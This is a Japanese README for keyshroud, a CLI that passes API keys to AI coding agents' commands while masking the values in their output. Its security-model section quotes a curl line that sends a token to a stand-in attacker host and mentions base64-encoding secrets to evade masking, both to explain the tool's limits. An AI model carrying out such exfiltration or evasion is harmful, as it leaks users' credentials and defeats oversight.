<div align="center">

<h1>
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup-dark.svg">
    <img alt="keyshroud" src="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup.svg" height="88">
  </picture>
</h1>

**エージェントはキーを使えても、値そのものを見ることはありません。**

keyshroud を使うと、Claude Code、Codex、Cursor、Cline、OpenCode、Gemini CLI、pi、omp が
API キーを必要とするコマンドを実行でき、シークレットの値は `<redacted:NAME>` としてのみ
モデルに届きます。

[![npm](https://img.shields.io/npm/v/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![Downloads](https://img.shields.io/npm/dm/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![CI](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml/badge.svg)](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](../LICENSE)
[![Node](https://img.shields.io/node/v/keyshroud.svg)](../package.json)

[クイックスタート](#クイックスタート) · [シークレットの保存場所](#シークレットの保存場所) · [対応エージェント](#対応エージェント) · [最小権限](#最小権限) · [CLI](#cli-リファレンス) · [比較](#他のツールとの比較) · [セキュリティモデル](#セキュリティモデル) · [FAQ](#よくある質問) · [ドキュメント](#ドキュメント) · [Web サイト](https://keyshroud.dev)

[🇬🇧 English](../README.md) · [🇻🇳 Tiếng Việt](README.vi.md) · [🇨🇳 简体中文](README.zh-CN.md) · [🇯🇵 日本語](README.ja-JP.md)

</div>

<p align="center"><img src="../assets/demo.gif" alt="デモ：新しいマシンで keyshroud add がマスクされたプロンプト経由で GitHub トークンをローカル vault に保存し、keyshroud run がコマンド出力でそれをマスクし、scan がファイルに漏れたコピーを見つける" width="860"></p>

```console
$ keyshroud run -- sh -c 'echo "deploying with $GH_TOKEN"; gh api user -q .login'
deploying with <redacted:GH_TOKEN>
dinhkarate
```

コマンドは本物のトークンを受け取ります。対話ログと、それを読むモデルに届くのは
`<redacted:GH_TOKEN>` だけです。（`keyshroud run` は常にマスクします。自分のターミナルでも同じです。
`--no-mask` は対話型プログラムにターミナルを渡します。）

## なぜ keyshroud？

コーディングエージェントが実際の作業を行うには認証情報が必要です。`gh`、`npm publish`、クラウド
CLI、Webhook、データベースなどです。よくある渡し方はどれも漏えいにつながります：

| よくあるやり方 | 問題になる点 |
|---|---|
| キーをチャットに貼り付ける | 対話ログ、プロバイダーのログ、以後のすべてのコンテキストウィンドウに残る |
| `.env` に置く | エージェントがデバッグ中に `cat` したり、コミットしたりする |
| vault の MCP サーバーを使う | ほとんどが平文の値をそのままモデルに返す |
| 有料のシークレットマネージャーを使う | `op run` には 1Password のサブスクリプションが必要で、しかも自分でラップしたコマンドしかマスクしない |

keyshroud は別の方法をとります：**エージェントは名前で作業し、コマンドは値を受け取り、
コマンドが出力するものはモデルが読む前にマスクされます。**

- **値ではなく名前。** エージェントに見えるのは `GH_TOKEN` と `keyshroud://GitHub token` だけで、トークンそのものは見えません。
- **出力のマスク。** stdout や stderr に届いた値は `<redacted:GH_TOKEN>` になります。自分でラップした
  コマンドでも、Claude Code と pi ではラップしていないコマンドでも同じです。
- **設定は不要。** 鍵が OS のキーチェーンに保存された暗号化 vault ファイルを使います。アカウントもサーバーも不要です。
- **既存の vault も使える。** 複数マシンなら Vaultwarden か Bitwarden。HashiCorp Vault、
  OpenBao、Infisical、1Password、AWS、Google Cloud、Azure は置かれている場所から読み取り、書き込みはしません。
- **無料。** MIT ライセンス、テレメトリなし。

## クイックスタート

**必要なもの：** Node.js ≥ 18.19。それ以外は何もいりません。

```bash
npm install -g keyshroud

# 1. シークレットを保存する：マスクされたプロンプトに入力しても、画面には表示されない。
#    最初の 1 件でローカル vault が作成される。
keyshroud add --env GH_TOKEN --item "GitHub token"

# 2. 使う
keyshroud run -- gh auth status
keyshroud run --no-mask -- claude   # 紐付けたすべてのシークレットを使える状態でエージェントを起動

# 3. すべてを確認する
keyshroud doctor
```

```console
$ keyshroud add --env GH_TOKEN --item "GitHub token"
Paste secret for GH_TOKEN: ****************************************
keyshroud: created the local vault ~/.config/keyshroud/vault.json; its key is in the macOS keychain (keyshroud-vault-9f2c4e6a1b3d5f70), so programs running as you can open it without asking.
created item=GitHub token env=GH_TOKEN targets=~/.config/keyshroud/env.json verified=yes
```

- **エージェントからも開始できる。** ターミナルがない場合、`add` はデスクトップに非表示入力のダイアログを開きます。
  エージェントがコマンドを実行し、あなたが値を貼り付けます。値がチャットを経由することはありません。
- **すでに `.env` がある？** `keyshroud import` がそのシークレットを vault に移し、
  コミットできる参照だけの `.env.refs` を書き出します。
- **セットアップをエージェントに任せることもできます。** これを Claude Code、Codex、Cursor、OpenCode、pi に貼り付けます：
  `Read https://keyshroud.dev/install.md and set up keyshroud for me.`

## 得られるもの

**値をモデルに渡さない**

| | |
|---|---|
| 🙈 **出力のマスク** | `keyshroud run` は stdout と stderr のすべてのシークレット値を `<redacted:NAME>` に置き換えます。終了コードに関係なく、2 つのチャンクに分割された値も漏らしません。 |
| 🪝 **エージェントフック** | pi/omp のフックはすべてのツール結果をマスクします。Claude Code の `PostToolUse` フックは成功したすべての結果（Bash、Read、Grep、MCP など）をマスクし、[`keyshroud claude-guard`](#guard-失敗したコマンドもマスク) は Bash コマンドの出力を、書き出される時点でマスクします。失敗したコマンドも対象です。 |
| 🔌 **MCP サーバー** | シェルのないクライアント向け：`secrets_run`、`secrets_list`、`secrets_request`、`vault_status`。シークレット値を返すツールはありません。 |
| ⌨️ **貼り付けて作成** | 新しいシークレットは、ターミナルのマスクされたプロンプト、エージェントが `add` を実行したときのデスクトップの非表示入力ダイアログ、または pi のマスクされたポップアップを介して入力します。チャットを経由しません。 |
| 🔎 **`scan`** | 作業ツリーに漏れた vault の値を、コミット前に見つけます。 |

**シークレットの保存場所**

| | |
|---|---|
| 🔐 **ローカル vault** | AES-256-GCM で暗号化されたファイルで、鍵は macOS のキーチェーン、Linux の Secret Service、Windows の DPAPI にあります。これらがない環境ではパスフレーズを使います。Mac で確認を求める場合は Touch ID を使えます。 |
| 💾 **バックアップ** | `keyshroud backup` はローカル vault を専用のパスフレーズで 1 つのファイルにコピーし、`keyshroud restore` はどのマシンでもそれを復元して名前を再び紐付けます。 |
| 🔄 **同期** | 同じシークレットを複数のマシンで使うなら、$5 の VPS や Raspberry Pi 上の Vaultwarden、または Bitwarden を使います。 |
| 🏢 **チームのシークレットマネージャー** | `vault://`、`infisical://`、`op://`、`awssecrets://`、`awsssm://`、`gcpsecrets://`、`azurekeyvault://`：読み取り専用のソースで、他のシークレットと同じように注入されマスクされます。 |

**使い方**

| | |
|---|---|
| 🔗 **コミットできる参照** | `.env.refs` ファイルの `GH_TOKEN=keyshroud://GitHub token`：値ではなく名前なので、安全にコミットできます。 |
| 🎯 **プロジェクトスコープ** | リポジトリの `.keyshroud.json`（`{ "only": ["STRIPE_*", "GH_TOKEN"] }`）は、その場所で `run`、`env`、エージェントが受け取るものを、そのプロジェクトが必要とする名前に絞ります。 |
| 📄 **`inject`** | `{{ keyshroud://… }}` テンプレートを権限 `0600` のファイルとして生成します。環境変数を読めないツール（`.npmrc`、kubeconfig）向けです。 |
| 🧾 **監査ログ** | `audit.jsonl` はどの*名前*がいつ、どのコマンドで使われたかを記録します。値は決して記録しません。 |
| ⚡ **高速** | ローカル vault はオフラインでもミリ秒単位で応答します。Vaultwarden では、シークレットごとに `bw get`（約 3 秒）する代わりに、セッションごとに 1 回まとめて `bw list items` を実行します。 |

## ユースケース

**「Claude Code が `.env` を読み続ける。」** `keyshroud import` を実行して値を vault に移し、
`GH_TOKEN=keyshroud://myapp GH_TOKEN` のような行を含む `.env.refs` を書き出してから、
`keyshroud run --no-mask --refs .env.refs -- claude` でエージェントを起動します。プラグインのフックが、
それでもツール結果に漏れたものをマスクします。

**「失敗したコマンドがトークンを対話ログに出力した。」**
[`keyshroud claude-guard`](#guard-失敗したコマンドもマスク) を有効にします。Claude Code で Bash コマンドが
出力するものはすべて、書き出される時点でマスクされます。コマンドが成功しても失敗しても同じです。

**「会社は HashiCorp Vault にシークレットを置いている。」** 一度だけ
`keyshroud source add vault --addr https://vault.example.com` を実行し、`.env.refs` に
`DB_PASSWORD=vault://secret/myapp/db#password` を書きます。エージェントは名前を見て、
値は Vault から読まれ、出力ではマスクされます。
[OpenBao、Infisical、1Password、AWS、Google Cloud、Azure](#チームのシークレットマネージャー-vault-openbao-infisical-1password-aws-google-cloud-azure) も同じです。

**「このリポジトリには専用のキーだけを渡したい。」** `keyshroud scope --only 'STRIPE_*,GH_TOKEN'` が
[`.keyshroud.json`](#最小権限-プロジェクト自身の名前) を書き出します。そこで作業するエージェントには、
他のプロジェクトのトークンが渡されません。

**「`op run` は好きだが 1Password は使いたくない。」** `keyshroud run` は同じ考え方です。
参照を入力として受け取り、マスクされた出力を返し、vault は自分のマシンか自分でホストするサーバーに置きます。

**「エージェントが新しいキーを追加する必要がある。」** エージェントは `keyshroud add` を実行するか
`secrets_request`（MCP）を呼び、デスクトップに非表示入力のダイアログが現れます。pi では `/secret` です。
あなたはそこに値を貼り付けます。

## シークレットの保存場所

| | 向いている用途 | 必要なもの |
|---|---|---|
| [**ローカル vault**](#ローカル-vault)（既定） | 1 台のマシン、設定不要 | 何もなし |
| [**Vaultwarden または Bitwarden**](#複数マシンで同期vaultwarden-または-bitwarden) | 同じシークレットを複数のマシンで | Bitwarden アカウントか自分の Vaultwarden、そして `bw` CLI |
| [**チームのシークレットマネージャー**](#チームのシークレットマネージャー-vault-openbao-infisical-1password-aws-google-cloud-azure) | 会社がすでにどこかに置いているシークレット | そこへの既存のサインイン |

これらは併用できます。参照でどの vault かを示します（`keyshroud://…`、`bw://…`、`vault://…`）。

### ローカル vault

`~/.config/keyshroud/vault.json` にはすべての項目が保存され、ランダムな 256 ビット鍵で AES-256-GCM
暗号化されます。項目名も暗号化されます。鍵の保存場所はマシンによって異なります：

| マシン | 鍵 | ロック解除 |
|---|---|---|
| macOS | ログインキーチェーン | 不要 |
| macOS、Touch ID（`KEYSHROUD_VAULT_KEY=secure-enclave`） | Secure Enclave 内の鍵でラップ | コマンドがシークレットを必要とするときに Touch ID。セッションは 30 分続く |
| デスクトップのキーリングがある Linux | Secret Service | 不要 |
| Windows | DPAPI（自分の Windows アカウントに紐付く） | 不要 |
| Docker、サーバー、SSH、systemd のない Linux | パスフレーズから導出（scrypt） | `keyshroud unlock`。セッションは 30 分続く |

紛失した鍵や忘れたパスフレーズは復元できず、`vault.json` を別のマシンにコピーしてもそこで開けません。
バックアップを使ってください。詳しくは [docs/local-vault.md](../docs/local-vault.md)。

### バックアップと復元

```bash
keyshroud backup                           # 新しいパスフレーズを尋ね、./keyshroud-backup-<date>.json を書き出す
keyshroud restore keyshroud-backup-….json  # 追加される内容。--yes で実行
```

バックアップは 1 つのファイルで、このマシンの鍵ではなく自分で選んだパスフレーズで暗号化されるため、
どこでも開けます。`restore` はまず名前の一覧を表示し、こちらで値が異なる項目は `--replace` を付けない限り
そのまま残し、変数名を再び紐付けます。新しいマシンでは、`keyshroud restore FILE --yes` だけで移行できます。
どちらもターミナルでのみ実行されます。[詳細](../docs/local-vault.md#backup-and-restore)。

### 複数マシンで同期：Vaultwarden または Bitwarden

```bash
npm install -g @bitwarden/cli
bw config server https://vault.example.com     # セルフホストの Vaultwarden。bitwarden.com では不要
bw login
mkdir -p ~/.config/keyshroud && echo bw > ~/.config/keyshroud/backend   # 新しい項目はそこへ
keyshroud unlock                                # 30 分。マスターパスワードは保存されない
```

`run`、フック、MCP サーバー、その他すべては Bitwarden CLI を通して同じように動きます。サーバーが
まだない場合は、[examples/vaultwarden](../examples/vaultwarden#readme) を参照してください。Docker Compose と Caddy で
空の VPS を `keyshroud doctor` が通る状態にします。セッション、確認なしでロック解除する方法、
ローカル vault に戻す方法、エージェント専用アカウントは [docs/vaultwarden.md](../docs/vaultwarden.md) にあります。

### チームのシークレットマネージャー: Vault, OpenBao, Infisical, 1Password, AWS, Google Cloud, Azure

会社には通常、すでにシークレットマネージャーがあります。keyshroud はそこから読み取り、
書き込みは一切しません。参照でどのシークレットかを示し、keyshroud の vault には何もコピーされません。

```bash
keyshroud source add vault --addr https://vault.example.com    # `vault login` のトークンを使って読む
keyshroud wire --env DB_PASSWORD --item 'vault://secret/myapp/db#password'
keyshroud run --only DB_PASSWORD -- ./migrate.sh
```

```dotenv
# .env.refs: 安全にコミット可能、名前だけ
DB_PASSWORD=vault://secret/myapp/db#password
STRIPE_KEY=awssecrets://prod/stripe#api_key
SENTRY_DSN=op://Engineering/Sentry/dsn
```

| システム | 参照 | サインインに使うもの |
|---|---|---|
| HashiCorp Vault、OpenBao（KV v1 と v2） | `vault://<mount>/<path>#<field>` | `source add vault`：`vault login` のトークン、別途指定したトークン、または AppRole |
| Infisical（クラウドまたはセルフホスト） | `infisical://<project id>/<environment>/[<folder>/]<NAME>` | `source add infisical`：マシンアイデンティティ（machine identity） |
| AWS Secrets Manager、SSM Parameter Store | `awssecrets://<name or ARN>[#<json key>]`、`awsssm://<parameter>` | 自分の `aws` CLI |
| 1Password | `op://<vault>/<item>/<field>` | 自分の `op` CLI |
| Google Cloud Secret Manager | `gcpsecrets://<project>/<secret>[#<json key>]` | 自分の `gcloud` CLI |
| Azure Key Vault | `azurekeyvault://<vault name>/<secret>[#<json key>]` | 自分の `az` CLI |

読み取り専用、HTTPS のみ、そして参照はサーバーを指定できないため、クローンしたリポジトリの
`.env.refs` があなたのトークンを別の場所へ送ることはできません。Vault、OpenBao、Infisical は
CI で実際のサーバーに対してテストされ、`op`、`gcloud`、`az` の経路はスタブ CLI に対してテストされます。
すべてのオプションと制限：[docs/team-secret-managers.md](../docs/team-secret-managers.md)。

## 対応エージェント

| エージェント | インストール | 使える機能 |
|---|---|---|
| **Claude Code** | [プラグイン](#claude-code) | SessionStart + PostToolUse のマスクフック、スキル。[`claude-guard`](#guard-失敗したコマンドもマスク) は失敗したコマンドもマスク |
| **pi / omp** | [`pi install npm:keyshroud`](#pi--omp) | 環境変数への注入、`tool_result` のマスク（失敗した呼び出しも含む）、`/secret` |
| **Codex、OpenCode、Gemini CLI、Cursor エージェント、Cline** | [`npx skills add dinhkarate/keyshroud`](#シェルを持つその他のエージェント) | スキル + 出力がマスクされる CLI |
| **Claude Desktop、チャットのみのクライアント** | [`mcpServers` JSON](#シェルのない-mcp-クライアント) | 出力がマスクされる MCP ツール |
| **任意のシェルや CI** | `keyshroud run -- <cmd>` | 環境変数の注入 + 出力のマスク |

シェルを持つエージェントは CLI を使います。コンテキスト内のツールスキーマを使わず、`keyshroud run` は
終了コードに関係なく出力をマスクします。MCP サーバーはコマンドを実行できないクライアント向けです。

### Claude Code

```bash
npm install -g keyshroud
```
```text
/plugin marketplace add dinhkarate/keyshroud
/plugin install keyshroud@keyshroud
```

- **SessionStart フック：** 存在するシークレットの*名前*を Claude に伝えます。パスワードを尋ねることはありません。
- **PostToolUse フック：** シークレットの値を含む成功したツール結果を `<redacted:NAME>` に
  書き換えます。
- **スキル：** 名前と参照を使い、シークレットを使うコマンドを `keyshroud run` 経由で
  実行するよう Claude に教えます。

Claude を keyshroud 経由で起動すると、その Bash コマンドでシークレットを利用できます：`keyshroud run --no-mask -- claude`
（`--no-mask` は Claude の画面にターミナルを渡します。ツールの結果は引き続きプラグインがマスクします）。
vault の項目を Claude Code 自身の API キーにすることもできます（`keyshroud claude-setup --item "Anthropic API key"`）。
残りは [docs/claude-code.md](../docs/claude-code.md) にあります。

### guard: 失敗したコマンドもマスク

```bash
keyshroud claude-guard          # 有効（macOS、Linux）。新しい Claude Code セッションで反映される
keyshroud claude-guard --off
```

Claude Code は失敗したコマンドの出力を書き換えられないため、フックだけではそうしたコマンドの出力が
マスクされずに残ります。guard を有効にすると、Claude Code は keyshroud 経由でシェルを起動します。
各 Bash コマンドは実際の bash または zsh で実行され、出力は Claude Code へ向かう途中でマスク処理を
通ります。コマンドが成功、失敗、中断のいずれの場合でも、また `keyshroud run` 経由で実行されたか
どうかに関係なく、値は `<redacted:NAME>` になります。マスク処理を起動できない場合、コマンドは
マスクされないまま実行されるのではなく、実行されません。コマンドあたりの追加時間は約 0.2 秒です。
[仕組みと制限](../docs/claude-code.md#the-guard-failed-commands-masked-too)。

### pi / omp

```bash
pi install npm:keyshroud
```

拡張機能は、プロバイダーの認証処理が完了する前に紐付けたシークレットをエージェントの環境に入れ、
すべてのツール結果（成功も失敗も）と入力した `!commands` の出力をマスクし、`/secret`
（説明、名前の確認、マスクされた貼り付け）を追加します。[詳細](../docs/agents.md#pi--omp)。

### シェルを持つその他のエージェント

Codex、OpenCode、Gemini CLI、Cursor のエージェント、Cline、その他コマンドを実行できるもの：CLI と
スキルをインストールします。スキルは、シークレットを使うコマンドを `keyshroud run -- …` として
実行し、新しいシークレットを `keyshroud add` で保存するようエージェントに教えます。

```bash
npm install -g keyshroud
npx skills add dinhkarate/keyshroud
```

`npx skills` には Node.js 22.20 以上が必要です。古い Node では、CLI に付属する
[スキルをコピー](../docs/agents.md#other-agents-with-a-shell)してください。

### シェルのない MCP クライアント

Claude Desktop、チャットのみのクライアント、またはコマンド実行を許可していないエージェント：

```json
{ "mcpServers": { "keyshroud": { "command": "keyshroud", "args": ["mcp"] } } }
```

`secrets_run` はシークレットを注入してコマンドを実行し、終了コードとマスクされた出力を返します。
`secrets_list`、`secrets_request`、`vault_status` が残りを補います。値を返すものはありません。
[詳細](../docs/agents.md#mcp-clients-without-a-shell)。

## 最小権限

既定では、`keyshroud run` はコマンドに紐付けたすべてのシークレットを渡します。絞り込む方法は 3 つです：

- **コマンドごと：** `keyshroud run --only GH_TOKEN -- gh pr list` はその名前だけを注入し、
  コマンドが継承する環境から他の紐付けた名前を除きます。その名前を解決できない場合（vault がロックされている、
  項目が存在しない）、コマンドは実行されません。
- **プロジェクトごと：** 以下のスコープファイル。
- **vault ごと：** Vaultwarden の場合、`keyshroud setup` がエージェント専用のアカウントを用意します。

### 最小権限: プロジェクト自身の名前

```bash
cd ~/code/shop
keyshroud scope --only 'STRIPE_*,GH_TOKEN'   # ./.keyshroud.json を書き出す
keyshroud scope                              # ここでスコープに入っているものと、入っていない名前の数
```

```json
{ "only": ["STRIPE_*", "GH_TOKEN"] }
```

そのディレクトリとその下では、`run`、`env`、`secrets_run`、pi のシェル、そして Claude Code が
セッション開始時に伝えられる名前は、スコープ内の名前に絞られ、スコープ外の名前は拒否されます。ファイルには
名前とパターンだけが入るので、コミットできます。マスクは絞られません。スコープ外の値が出力に
現れてもマスクされます。スコープとして読めないファイルは、すべてではなく何もスコープに入れません。
これは事故を防ぐための既定値であり、壁ではありません：
[docs/project-scope.md](../docs/project-scope.md)。

### 最小権限: 別のエージェントアカウント

Vaultwarden または Bitwarden では、ロック解除されたセッションで vault 全体にアクセスできます。
`keyshroud setup --email you+agent@example.com` は、エージェントに必要なシークレットだけを持つ
専用アカウントに keyshroud 専用の `bw` ログインを作り、`keyshroud migrate` が紐付けた項目を
そこへコピーします。[docs/vaultwarden.md](../docs/vaultwarden.md#least-privilege-a-separate-agent-account)。

## CLI リファレンス

```text
Store     keyshroud add --env NAME --item ITEM        store a new secret (masked prompt or dialog)
          keyshroud import [--yes]                    move a .env into the vault, write .env.refs
          keyshroud rotate --item ITEM                replace a value
          keyshroud wire | unwire | list | rm         manage names and items
Use       keyshroud run [--only A,B] [--refs F] -- <cmd>
          keyshroud inject -i template -o out         render a template into a 0600 file
          keyshroud env                               the names available here
Check     keyshroud doctor | status | scan [paths] | redact < log.txt
Narrow    keyshroud scope [--only A,B_* | --clear]    this directory's .keyshroud.json
Vault     keyshroud unlock | lock | rekey | backup | restore FILE
Sources   keyshroud source [add vault|infisical … | rm …]
Agents    keyshroud mcp | claude-setup | claude-guard [--off] | link-cli
```

| 参照 | 解決先 |
|---|---|
| `keyshroud://GitHub token` | ローカル vault に保存された値（`/notes` でそのメモ） |
| `bw://GitHub CLI token` | Vaultwarden ログインのパスワード（`/username`、`/notes`、`/totp`、`/fields/<name>`） |
| `vault://secret/myapp/db#password` | HashiCorp Vault または OpenBao の KV シークレットのフィールド |
| `op://Engineering/Sentry/dsn` | `op read` が返す内容（1Password） |
| `awssecrets://prod/stripe#api_key` | AWS Secrets Manager の JSON シークレットのキー |

**終了コード：** `0` 成功 · `2` 使用方法の誤り · `3` vault がロックされているか利用不可 · `4` シークレットがない、
または項目名が曖昧 · `5` 既存の状態の上書きを拒否。`run` は子プロセスのコードで終了します。

すべてのコマンド、フラグ、参照形式、環境変数：[docs/cli.md](../docs/cli.md)。

## 仕組み

```
              ┌──────────────────────────── your machine ─────────────────────────────┐
              │  vault.json ◄── key: keychain · Secret Service · DPAPI · passphrase   │
              │      │                                                                │
              │      ▼                                                                │
 Vaultwarden ◄┼─bw─ keyshroud ─ resolves keyshroud:// and bw:// refs ─► command's env │
 team vault  ◄┼──── (read-only)                                          │            │
              │      └──── redactor ◄──── stdout / stderr ◄──────────────┘            │
              │                │ <redacted:NAME>                                      │
              └────────────────┼──────────────────────────────────────────────────────┘
                               ▼
                  agent transcript / LLM provider
```

1. **紐付け。** シークレットは*名前*で紐付けられます：`GH_TOKEN → keyshroud://GitHub token`。情報は
   `~/.config/keyshroud/env.json` またはプロジェクトの `.env.refs` に書き込まれ、名前と参照だけが保存されます。
2. **解決と注入。** コマンドが実行されると、値は vault から読まれ、子プロセスの
   環境変数に入ります。argv に入ることも、ツール結果に入ることもありません。
3. **マスク。** コマンドの出力は、すべての値を把握するマスク処理を通ります。Claude Code の
   フックと guard はそのプロセスの外で動くため、代わりに鍵付き HMAC のフィンガープリント索引を
   使い、平文を保持しません。

長い版：[docs/how-it-works.md](../docs/how-it-works.md)。

## 他のツールとの比較

エージェントにシークレットを渡すツールは 4 つのアプローチに分かれます（2026-11-15 に各ツールの
ドキュメントを読んだ時点。訂正は issue で歓迎します）：

| アプローチ | 例 | モデルは値を見る？ | ラップしていないコマンド | 対象 |
|---|---|---|---|---|
| **名前を入れて、マスクされた出力を出す** | **keyshroud** | いいえ。ツール出力はマスクされる | Claude Code（フック、加えて失敗したコマンドには guard）と pi/omp でもマスクされる。他のエージェントは `keyshroud run` に依存 | コマンドが環境変数やファイルから読むあらゆるシークレット |
| 自分の子プロセスをマスクするラッパー | 1Password `op run`、`dotenvx run --redact`、`varlock run`、`secretspec run` | ラップしたコマンドの出力からは見えない | マスクされない | 同じだが、ラップしたコマンドのみ |
| vault の MCP サーバー | Bitwarden MCP、HashiCorp Vault MCP、Doppler MCP、Infisical MCP（既定） | はい。ツールが返す | 該当なし | シークレットの検索 |
| プレースホルダー付きの出口プロキシ | Infisical Agent Vault、OneCLI、`fnox proxy`、NVIDIA OpenShell 向け 1Password、Claude Code の `sandbox.credentials` マスク | いいえ。エージェントが持つのはプレースホルダー | 該当なし。実際の値はシェルに入らない | 許可したホストの HTTP(S) 認証情報。リクエストを読めるプロキシが必要 |

keyshroud は vault をあなたの手元に置き（ローカルファイル、自分の Vaultwarden、またはチームが運用する
マネージャー）、アカウントを必要とせず、無料です。悪意のある、あるいはプロンプトインジェクションを
受けたエージェントに対しては、対象となる認証情報について出口プロキシのほうが強力です。
keyshroud はデータベースのパスワード、SSH 鍵と署名鍵、環境変数を読むあらゆる CLI を
対象にします。両者は組み合わせられます。すでに 1Password を契約しているなら、その `op run` と
Environments はよくできており、keyshroud は `op://` 参照も読みます。

## セキュリティモデル

keyshroud が防ぐのは**意図しない漏えい**です。コマンドが出力したためにシークレットが対話ログ、
プロバイダーのログ、スクリーンショット、コミット、モデルのコンテキストに入ってしまうことです。

悪意のある、あるいはプロンプトインジェクションを受けたエージェントを安全にするものでは**ありません**。
`keyshroud run -- curl https://evil.example -d "$TOKEN"` を実行できる、または値を出力前に
base64 エンコードできるエージェントは、それを外部に送信できます。それが脅威モデルなら、
通信経路上でプレースホルダーを実際の認証情報に差し替える出口プロキシを使い、各セッションが受け取る
シークレットを制限し（`--only`、スコープ）、人間がコマンドを承認する状態を保ってください。

頼る前に知っておくこと：

- **鍵は OS が鍵を保管する場所にあります。** キーチェーンモードでは、あなたとして動くどのプログラムも
  （エージェントも含めて）ローカル vault を開けます。確認を求める場合は、ローカル vault をパスフレーズ、または Mac なら
  Touch ID を使って作成してください。
- **マスクは完全一致です。** 部分的な値や変換された値（`${TOKEN:0:10}`、base64）はマスクされず、
  6 文字未満の値は決してマスクされません。
- **Claude Code では、失敗したコマンドは guard を有効にしたとき**、または `keyshroud run` 経由で
  実行したときにだけマスクされます。
- **スコープと guard は既定値であり、壁ではありません。** あなたとして動くプログラムはそれらを変更できます。
- **値は決して現れません。** argv、ログ、keyshroud 自身の診断、MCP の結果、フックの出力、監査ログに現れることはありません。
  これはテスト済みです。

テストしているすべての保証と既知の制限：[docs/security.md](../docs/security.md)。脆弱性は非公開で
報告してください。[SECURITY.md](../SECURITY.md) を参照。

## よくある質問

**Vaultwarden は必要？** いいえ。既定ではシークレットは自分のマシン上の暗号化ファイルに保存されます。
Vaultwarden または Bitwarden は任意で、同じシークレットを複数のマシンで使うためのものです。

**シークレットはマシンの外に出る？** ローカル vault なら出ません。keyshroud には独自のバックエンドが
なく、テレメトリも送りません。値は実行するコマンドの環境変数に入ります。

**エージェントはまだキーを使える？** はい。コマンドには本物の値が渡り、マスクされるのはモデルが
読むテキストだけです。

**これはサンドボックス？** いいえ。防ぐのは*意図しない*漏えいです。[セキュリティモデル](#セキュリティモデル)を参照してください。

**Claude Code 自身がやっているのでは？** 一部は、別のやり方で。Claude Code は `.env` などのファイルの
読み取りを拒否でき、サンドボックスはコマンドに認証情報のプレースホルダーを見せて、許可したホストへの
リクエストに実際の値を載せられます（`sandbox.credentials`、オプトイン、サンドボックス化された Bash のみ）。
シークレットストアは持たず、ツールが出力したものを書き換えません。keyshroud はそのストアであり、
エージェント間で同じように動き、出力をマスクします。両者は組み合わせられます。

**`.env` を `.gitignore` に入れるだけではダメ？** それで防げるのはコミットであって、読み取りでは
ありません。エージェントはデバッグのために `.env` を読み、読んだ内容はモデルのプロバイダーに送られます。

**職場で HashiCorp Vault（または AWS、1Password など）を使っています。シークレットを移す必要は？**
いいえ。keyshroud は置かれている場所から読み取り、書き込みはしません。

**ローカル vault はどうバックアップする？** `keyshroud backup`。`vault.json` をそのままコピーしても
バックアップにはなりません。それはその鍵でしか開けず、鍵はこのマシンのキーストアに残ります。

**Windows で動く？** はい。Windows 10 と Node 22 でテスト済みです。guard は macOS と Linux のみです。

CI、Docker、0.7 からのアップグレードについては [docs/faq.md](../docs/faq.md) を参照してください。

## ドキュメント

同じページを [keyshroud.dev/docs](https://keyshroud.dev/docs/) でも読めます（より読みやすい表示です）。

| | |
|---|---|
| [プロジェクトを `.env` から移行する](../docs/migrate-from-dotenv.md) | ガイド：`import`、`.env.refs`、平文の削除、チームメンバーがすること |
| [CI と Docker](../docs/ci-and-docker.md) | ガイド：GitHub Actions、Docker ビルド、コンテナでパスフレーズ vault を使う |
| [漏えいしたキーをローテーションする](../docs/rotate-a-key.md) | ガイド：コピーを探す、値を置き換える、新しい値が反映される範囲 |
| [トラブルシューティング](../docs/troubleshooting.md) | 解決できない名前、ロックされた vault、マスクされずに出力された値 |
| [ローカル vault](../docs/local-vault.md) | 鍵のモード、Touch ID、セッション、バックアップと復元 |
| [Vaultwarden または Bitwarden](../docs/vaultwarden.md) | 同期の設定、セッション、別のエージェントアカウント、ローカル vault に戻す方法 |
| [チームのシークレットマネージャー](../docs/team-secret-managers.md) | Vault、OpenBao、Infisical、1Password、AWS、Google Cloud、Azure |
| [プロジェクトスコープ](../docs/project-scope.md) | `.keyshroud.json`：何を絞り、何を絞らないか |
| [Claude Code](../docs/claude-code.md) | プラグインのフック、`claude-setup`、guard |
| [pi、omp とその他のエージェント](../docs/agents.md) | pi/omp 拡張、スキル、MCP サーバー |
| [CLI リファレンス](../docs/cli.md) | すべてのコマンド、参照形式、終了コード、環境変数 |
| [仕組み](../docs/how-it-works.md) | 紐付け、ロック解除、解決、注入、マスク |
| [セキュリティモデル](../docs/security.md) | テストしている保証と既知の制限 |
| [FAQ](../docs/faq.md) | Windows、アップグレード、短い回答 |
| [エージェント向けセットアップガイド](https://keyshroud.dev/install.md) | AI エージェント向けに書かれた手順 |

docs/ 配下のページは英語です。

## 開発

```bash
npm install
npm run check        # 型チェック + テスト（スタブの bw、実際の vault なし）+ ビルド
# Docker で実際のサーバーに対して各ソースをテスト（Vault、OpenBao、Infisical、AWS エミュレーター）：
export $(sh test/live-servers.sh) && node --test test/live.test.ts; sh test/live-servers.sh down
node src/cli.ts doctor   # ソースから実行（Node ≥ 22.18 は型を削除する）
```

詳細は [CONTRIBUTING.md](../CONTRIBUTING.md) を参照してください。ランタイム非依存のコアは `src/core.ts` にあり
（ローカル vault のファイル形式は `src/vault.ts`、各ソースのプロトコルは `src/sources.ts`）、
エージェント連携は `extensions/`、`src/mcp.ts`、`src/hooks.ts` にあります。

## クレジット

[@jmcombs/pi-1password](https://www.npmjs.com/package/@jmcombs/pi-1password) に触発されました。
そのポップアップ UI と診断表示の構成をここに移植しています（MIT）。出力のマスクは 1Password の `op run` に
倣っています。Anthropic、Bitwarden, Inc.、Vaultwarden プロジェクト、およびここに挙げたどのベンダーとも
提携していません。"Bitwarden" は Bitwarden, Inc. の商標です。

## ライセンス

[MIT](../LICENSE) © 2026 dinhkarate
